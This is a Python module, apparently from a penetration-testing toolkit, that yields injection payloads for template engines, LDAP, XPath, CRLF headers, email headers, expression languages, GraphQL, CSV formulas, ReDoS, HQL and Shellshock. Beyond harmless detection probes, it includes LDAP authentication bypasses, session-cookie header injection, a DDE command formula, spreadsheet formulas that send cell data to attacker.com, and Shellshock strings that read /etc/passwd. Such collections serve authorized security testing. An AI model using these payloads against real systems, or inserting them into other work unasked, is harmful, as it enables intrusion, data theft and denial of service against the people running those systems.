"""
Miscellaneous injection payload generators.

This module covers injection types NOT handled by dedicated skills:
- SQL Injection -> sql-injection-testing
- NoSQL Injection -> nosql-injection-testing
- XSS -> xss-testing
- XXE -> xxe-testing
- Command Injection -> command-injection-testing

CWE Coverage: CWE-1336, CWE-90, CWE-643, CWE-652, CWE-93, CWE-113,
              CWE-917, CWE-1333, CWE-1236, CWE-94, CWE-95,
              CWE-200, CWE-400, CWE-502, CWE-78, CWE-89, CWE-943
"""

from typing import Generator


def ssti_payloads() -> Generator[dict, None, None]:
    """
    Server-Side Template Injection payloads.
    CWE-1336: Improper Neutralization in Template Engine.
    """
    payloads = [
        # Detection payloads (math eval)
        {"payload": "{{7*7}}", "engine": "jinja2/twig", "expected": "49"},
        {"payload": "${7*7}", "engine": "freemarker/thymeleaf", "expected": "49"},
        {"payload": "#{7*7}", "engine": "jsp_el/thymeleaf", "expected": "49"},
        {"payload": "<%= 7*7 %>", "engine": "erb", "expected": "49"},
        {"payload": "{7*7}", "engine": "smarty", "expected": "49"},
        {"payload": "#set($x=7*7)$x", "engine": "velocity", "expected": "49"},
        {"payload": "{{7*'7'}}", "engine": "jinja2", "expected": "7777777"},
        {"payload": "${{7*7}}", "engine": "pebble", "expected": "49"},
        # Engine identification
        {"payload": "{{config}}", "engine": "jinja2", "expected": "config object"},
        {"payload": "{{_self.env}}", "engine": "twig", "expected": "env object"},
        {"payload": "${.data_model}", "engine": "freemarker", "expected": "data model"},
    ]
    yield from payloads


def ldap_payloads() -> Generator[dict, None, None]:
    """
    LDAP Injection payloads.
    CWE-90: LDAP Injection.
    """
    payloads = [
        {"payload": "*", "type": "wildcard", "description": "Return all entries"},
        {"payload": "*)(&", "type": "filter_break", "description": "Break filter syntax"},
        {"payload": "*)(|(&", "type": "filter_manipulation", "description": "Inject OR"},
        {"payload": "admin)(|(password=*))", "type": "auth_bypass", "description": "Bypass auth"},
        {"payload": "admin)(!(&(1=0", "type": "not_injection", "description": "NOT operator"},
        {"payload": "*))%00", "type": "null_byte", "description": "Null byte termination"},
        {"payload": ")(cn=*)", "type": "attribute_enum", "description": "Enumerate cn"},
        {"payload": "*)(uid=*))(|(uid=*", "type": "union_style", "description": "Union query"},
    ]
    yield from payloads


def xpath_payloads() -> Generator[dict, None, None]:
    """
    XPath Injection payloads.
    CWE-643: XPath Injection.
    """
    payloads = [
        {"payload": "' or '1'='1", "type": "boolean", "description": "Always true"},
        {"payload": "' or ''='", "type": "boolean", "description": "Empty equals"},
        {"payload": "1 or 1=1", "type": "numeric", "description": "Numeric true"},
        {"payload": "'] | //user/*[contains(*,'", "type": "union", "description": "Union select"},
        {"payload": "' or count(//*)>0 or '1'='1", "type": "count", "description": "Count nodes"},
        {"payload": "'", "type": "error", "description": "Syntax error trigger"},
        {"payload": "1' and '1'='1", "type": "and_true", "description": "AND true"},
        {"payload": "1' and '1'='2", "type": "and_false", "description": "AND false"},
    ]
    yield from payloads


def xquery_payloads() -> Generator[dict, None, None]:
    """
    XQuery Injection payloads.
    CWE-652: XQuery Injection.
    """
    payloads = [
        {"payload": "' or '1'='1", "type": "boolean", "description": "Boolean bypass"},
        {"payload": "') or ('1'='1", "type": "paren_bypass", "description": "Parenthesis bypass"},
        {
            "payload": "for $x in doc('users.xml')//user return $x",
            "type": "flwor",
            "description": "FLWOR injection",
        },
        {"payload": "doc('file:///etc/passwd')", "type": "file_read", "description": "File access"},
    ]
    yield from payloads


def crlf_payloads() -> Generator[dict, None, None]:
    """
    CRLF / HTTP Header Injection payloads.
    CWE-93, CWE-113: CRLF Injection, HTTP Response Splitting.
    """
    payloads = [
        # URL encoded
        {"payload": "%0d%0aX-Injected:true", "encoding": "url", "description": "Header injection"},
        {
            "payload": "%0d%0aSet-Cookie:session=hijacked",
            "encoding": "url",
            "description": "Cookie injection",
        },
        {
            "payload": "%0d%0a%0d%0a<html>Injected</html>",
            "encoding": "url",
            "description": "Body injection",
        },
        {"payload": "%0aX-Injected:true", "encoding": "url_lf", "description": "LF only"},
        {"payload": "%0dX-Injected:true", "encoding": "url_cr", "description": "CR only"},
        # Raw
        {"payload": "\r\nX-Injected:true", "encoding": "raw", "description": "Raw CRLF"},
        {"payload": "\nX-Injected:true", "encoding": "raw_lf", "description": "Raw LF"},
        # Double encoding
        {
            "payload": "%250d%250aX-Injected:true",
            "encoding": "double",
            "description": "Double encoded",
        },
        # Host header
        {"payload": "evil.com", "type": "host_header", "description": "Host header poisoning"},
    ]
    yield from payloads


def email_header_payloads() -> Generator[dict, None, None]:
    """
    Email Header Injection payloads.
    CWE-93: CRLF Injection (in SMTP context).
    """
    payloads = [
        {
            "payload": "victim@test.com%0ABcc:attacker@evil.com",
            "type": "bcc",
            "description": "BCC injection",
        },
        {
            "payload": "victim@test.com%0ACc:attacker@evil.com",
            "type": "cc",
            "description": "CC injection",
        },
        {
            "payload": "victim@test.com\r\nBcc:attacker@evil.com",
            "type": "bcc_raw",
            "description": "Raw BCC",
        },
        {
            "payload": "test%0ASubject:INJECTED",
            "type": "subject",
            "description": "Subject injection",
        },
        {
            "payload": "test\r\nContent-Type:text/html",
            "type": "content_type",
            "description": "Content-Type",
        },
    ]
    yield from payloads


def el_payloads() -> Generator[dict, None, None]:
    """
    Expression Language Injection payloads.
    CWE-917: Expression Language Injection.
    """
    payloads = [
        # Detection (math eval)
        {"payload": "${7*7}", "framework": "generic", "expected": "49"},
        {"payload": "#{7*7}", "framework": "jsp_el", "expected": "49"},
        {"payload": "%{7*7}", "framework": "ognl", "expected": "49"},
        {"payload": "*{7*7}", "framework": "thymeleaf", "expected": "49"},
        # Spring EL
        {"payload": "${applicationScope}", "framework": "spring", "description": "App scope"},
        {
            "payload": "#{T(java.lang.System).getenv()}",
            "framework": "spring",
            "description": "Env vars",
        },
        # OGNL (Struts)
        {"payload": "%{#context}", "framework": "ognl", "description": "Context access"},
        {"payload": "${#_memberAccess}", "framework": "ognl", "description": "Member access"},
        # MVEL
        {
            "payload": "${Runtime.getRuntime()}",
            "framework": "mvel",
            "description": "Runtime access",
        },
    ]
    yield from payloads


def javascript_eval_payloads() -> Generator[dict, None, None]:
    """
    JSON/JavaScript Eval Injection payloads.
    CWE-94, CWE-95: Code/Eval Injection.

    These are detection-only payloads intended to confirm server-side evaluation.
    """
    payloads = [
        {"payload": "7*7", "expected": "49", "description": "Math evaluation"},
        {"payload": "Math.imul(7,7)", "expected": "49", "description": "Built-in math"},
        {"payload": "['a','b'].length", "expected": "2", "description": "Array length"},
        {
            "payload": "JSON.stringify({a:1})",
            "expected": '{"a":1}',
            "description": "JSON stringify",
        },
    ]
    yield from payloads


def graphql_payloads() -> Generator[dict, None, None]:
    """
    GraphQL Injection/Abuse payloads.
    Related to CWE-74 (Injection) and CWE-200 (Information Disclosure).
    """
    payloads = [
        # Introspection
        {
            "query": "{__schema{queryType{name}}}",
            "type": "introspection",
            "description": "Schema query type",
        },
        {
            "query": "{__schema{types{name,fields{name}}}}",
            "type": "introspection",
            "description": "Full schema",
        },
        {
            "query": "{__schema{mutationType{name,fields{name}}}}",
            "type": "introspection",
            "description": "Mutations",
        },
        # Field suggestions
        {
            "query": "{user{passwor}}",
            "type": "field_suggestion",
            "description": "Field suggestion abuse",
        },
        # Nested queries (DoS)
        {
            "query": "{user{friends{friends{friends{name}}}}}",
            "type": "nested_dos",
            "description": "Deep nesting",
        },
        # Batching
        {
            "query": "[{query:user(id:1){name}},{query:user(id:2){name}}]",
            "type": "batching",
            "description": "Batch query",
        },
        # Injection via arguments
        {
            "query": "{user(id:\"1' OR '1'='1\"){name}}",
            "type": "sqli_via_graphql",
            "description": "SQL injection via arg",
        },
    ]
    yield from payloads


def csv_formula_payloads() -> Generator[dict, None, None]:
    """
    CSV/Formula Injection payloads.
    CWE-1236: Improper Neutralization of Formula Elements in CSV.
    """
    payloads = [
        # Detection (safe)
        {"payload": "=1+1", "type": "basic", "description": "Basic formula"},
        {"payload": "=SUM(1,2)", "type": "function", "description": "SUM function"},
        {"payload": "+1+1", "type": "plus_prefix", "description": "Plus prefix"},
        {"payload": "-1+1", "type": "minus_prefix", "description": "Minus prefix"},
        {"payload": "@SUM(1+1)", "type": "at_prefix", "description": "@ prefix"},
        # DDE (detection only - dangerous in real use)
        {"payload": "=cmd|'/C calc'!A0", "type": "dde", "description": "DDE command"},
        # Hyperlink exfil
        {
            "payload": '=HYPERLINK("http://attacker.com/?d="&A1)',
            "type": "exfil",
            "description": "Data exfil",
        },
        # ImportXML
        {
            "payload": '=IMPORTXML("http://attacker.com","//")',
            "type": "import",
            "description": "Import data",
        },
    ]
    yield from payloads


def redos_payloads() -> Generator[dict, None, None]:
    """
    Regex Injection / ReDoS payloads.
    CWE-1333: Inefficient Regular Expression Complexity.
    """
    payloads = [
        # Evil regex patterns
        {"pattern": "(a+)+$", "input": "a" * 25 + "!", "description": "Nested quantifiers"},
        {"pattern": "((a+)+)+$", "input": "a" * 20 + "!", "description": "Double nested"},
        {"pattern": "(a|a)+$", "input": "a" * 25 + "!", "description": "Alternation"},
        {"pattern": "([a-zA-Z]+)*$", "input": "a" * 25 + "1", "description": "Character class"},
        {"pattern": "(.*a){20}", "input": "a" * 20 + "b", "description": "Greedy with count"},
        {"pattern": "^(a+)+$", "input": "a" * 30 + "!", "description": "Anchored nested"},
    ]
    yield from payloads


def orm_hql_payloads() -> Generator[dict, None, None]:
    """
    ORM/HQL Injection payloads (beyond basic SQL).
    Related to CWE-89 and CWE-943.
    """
    payloads = [
        # HQL specific
        {"payload": "' or 1=1 --", "orm": "hibernate", "description": "Basic HQL injection"},
        {
            "payload": "' and substring(password,1,1)='a",
            "orm": "hibernate",
            "description": "Substring extraction",
        },
        {
            "payload": "admin' AND (SELECT COUNT(*) FROM User)>0 AND '1'='1",
            "orm": "hibernate",
            "description": "Subquery",
        },
        # JPA/JPQL
        {"payload": "' OR ''='", "orm": "jpa", "description": "JPQL bypass"},
        # Django ORM
        {"payload": "__contains", "orm": "django", "description": "Field lookup"},
        {"payload": "__regex", "orm": "django", "description": "Regex lookup"},
    ]
    yield from payloads


def yaml_config_payloads() -> Generator[dict, None, None]:
    """
    YAML/Config Injection payloads (non-deserialization).
    Related to CWE-502.
    """
    payloads = [
        # Anchor/alias abuse
        {
            "payload": "admin: &admin true\nrole: *admin",
            "type": "anchor",
            "description": "Anchor reference",
        },
        # Merge key
        {"payload": "<<: *dangerous", "type": "merge", "description": "Merge key injection"},
        # Multi-document
        {
            "payload": "---\noverride: true",
            "type": "multi_doc",
            "description": "Document separator",
        },
        # Type confusion
        {"payload": "value: !!str 123", "type": "type_tag", "description": "Type tag"},
    ]
    yield from payloads


def shellshock_payloads() -> Generator[dict, None, None]:
    """
    Shellshock / Environment Variable Injection payloads.
    CWE-78 variant for CVE-2014-6271.
    """
    payloads = [
        {
            "payload": "() { :; }; echo SHELLSHOCK",
            "type": "basic",
            "description": "Basic Shellshock",
        },
        {"payload": "() { :; }; /bin/sleep 5", "type": "time", "description": "Time-based"},
        {
            "payload": "() { :;}; /bin/cat /etc/passwd",
            "type": "file_read",
            "description": "File read",
        },
        {"payload": "() { :; }; /usr/bin/id", "type": "id", "description": "ID command"},
    ]
    yield from payloads


def get_all_payloads() -> Generator[dict, None, None]:
    """Yield all miscellaneous injection payloads."""
    yield from [{"type": "ssti", **p} for p in ssti_payloads()]
    yield from [{"type": "ldap", **p} for p in ldap_payloads()]
    yield from [{"type": "xpath", **p} for p in xpath_payloads()]
    yield from [{"type": "xquery", **p} for p in xquery_payloads()]
    yield from [{"type": "crlf", **p} for p in crlf_payloads()]
    yield from [{"type": "email_header", **p} for p in email_header_payloads()]
    yield from [{"type": "el", **p} for p in el_payloads()]
    yield from [{"type": "js_eval", **p} for p in javascript_eval_payloads()]
    yield from [{"type": "graphql", **p} for p in graphql_payloads()]
    yield from [{"type": "csv_formula", **p} for p in csv_formula_payloads()]
    yield from [{"type": "redos", **p} for p in redos_payloads()]
    yield from [{"type": "orm_hql", **p} for p in orm_hql_payloads()]
    yield from [{"type": "yaml_config", **p} for p in yaml_config_payloads()]
    yield from [{"type": "shellshock", **p} for p in shellshock_payloads()]


if __name__ == "__main__":
    print("=== Miscellaneous Injection Payloads ===\n")

    print("SSTI Payloads:")
    for i, p in enumerate(list(ssti_payloads())[:5], 1):
        print(f"  {i}. {p['payload']} ({p['engine']})")

    print("\nLDAP Payloads:")
    for i, p in enumerate(list(ldap_payloads())[:5], 1):
        print(f"  {i}. {p['payload']} ({p['type']})")

    print("\nCRLF Payloads:")
    for i, p in enumerate(list(crlf_payloads())[:5], 1):
        print(f"  {i}. {p['payload']} ({p['description']})")

    print("\nEL Payloads:")
    for i, p in enumerate(list(el_payloads())[:5], 1):
        print(f"  {i}. {p['payload']} ({p['framework']})")
